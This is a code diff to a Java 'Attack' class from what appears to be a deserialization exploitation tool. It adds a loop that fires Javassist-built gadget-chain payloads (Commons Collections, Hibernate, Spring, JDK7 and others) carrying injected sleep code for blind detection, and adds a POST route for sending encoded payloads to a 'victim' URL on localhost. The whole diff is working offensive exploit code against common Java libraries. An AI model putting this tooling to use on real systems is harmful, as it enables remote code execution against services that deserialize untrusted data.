@@ -33,6 +33,11 @@ public class Attack {
     public static final int MIN_ATTEMPTS = 1;
 
     /**
+     * Use post to push the payload
+     */
+    public static final String ATTACK_METHOD = "POST";
+
+    /**
      * Run basic tests against the host: java versions, OS detections,
      */
     public void dumpReport() throws Exception {
@@ -47,8 +52,18 @@ public class Attack {
         log("Sleep Commons06 worked: %s", sleep06Worked);
         log(" ");
 
-        // CommonsCollections 2,3,4 are using template with Code construction javassist.
-        // This module is not implemented yet.
+        // Javassist based exploits.
+        // CC2, CC4 are Commons Collection 4.x exploits.
+        final String sleepCode = String.format("java.lang.Thread.sleep(%sl);", DEFAULT_SLEEP_TIME);
+        final Collection<String> javassistExps = Arrays.asList("cb1", "cc2", "cc3", "cc4",
+        "hibernate", "weld", "jboss", "jdk7", "json",
+        "rhino", "rome", "spring1", "spring2");
+        for(String expClass : javassistExps){
+            JSONObject spec = Utils.parseJSON(String.format("{javassist:\"%s\", code:\"%s\"}", expClass, sleepCode));
+            final boolean specWorked = applyRawPayloadOnVictim(spec);
+            log("Javassist[%10s] worked: %s", expClass, specWorked);
+        }
+        log(" ");
 
         // Test maximum length of the payload accepted by the service
         final boolean len1k = applyPayloadOnVictim(
@@ -404,24 +419,38 @@ public class Attack {
 
     public RunResult runPayload(JSONObject payload) throws Exception {
         final byte[] payloadByte = generator.mainParse(payload);
+        final RunResult rRes = new RunResult();
+        long timeStart = 0;
+        String result = null;
+
+        final String payloadStr = Utils.base64UrlFriendly(payloadByte);
+        final String payloadUrlFriendly = URLEncoder.encode(payloadStr, "UTF-8");
 
         // Transition from having the prepared payload to
         // executing the payload on the victim host needs to be
         // adapted to your application.
-        final String payloadStr = Utils.base64UrlFriendly(payloadByte);
-        final String payloadUrlFriendly = URLEncoder.encode(payloadStr, "UTF-8");
-        final String url = "http://localhost:8222/suffer/" + payloadUrlFriendly;
+        if (ATTACK_METHOD.equalsIgnoreCase("get")) {
+            // Execute the payload, measure the time spent in the call for
+            // the blind decision.
+            final String url = "http://localhost:8222/suffer/" + payloadUrlFriendly;
+            timeStart = System.currentTimeMillis();
+            try {
+                result = AttackUtils.httpGet(url);
+            } catch (Exception e) {
+                result = null;
+                log("Exception in get Req");
+            }
 
-        // Execute the payload, measure the time spent in the call for
-        // the blind decision.
-        final RunResult rRes = new RunResult();
-        final long timeStart = System.currentTimeMillis();
-        String result = null;
-
-        try {
-            result = AttackUtils.httpGet(url);
-        } catch(Exception e){
-            log("Exception in get Req");
+        } else {
+            // Execute the payload, measure the time spent in the call for
+            // the blind decision.
+            timeStart = System.currentTimeMillis();
+            try {
+                result = AttackUtils.httpPost("http://localhost:8222/suffer/", payloadUrlFriendly);
+            } catch (Exception e) {
+                result = null;
+                log("Exception in post Req");
+            }
         }
 
         // Build the result.
